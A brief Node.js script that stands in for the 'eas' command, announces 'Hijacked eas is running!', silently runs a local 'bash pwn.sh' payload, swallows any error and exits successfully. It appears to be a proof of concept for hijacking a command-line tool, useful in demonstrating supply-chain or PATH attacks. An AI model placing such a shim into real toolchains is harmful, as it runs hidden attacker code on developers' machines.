#!/usr/bin/env node
const cp = require("child_process");
console.log("Hijacked eas is running!");
try {
  cp.execSync("bash pwn.sh", { stdio: "inherit" });
} catch (e) {}
process.exit(0);
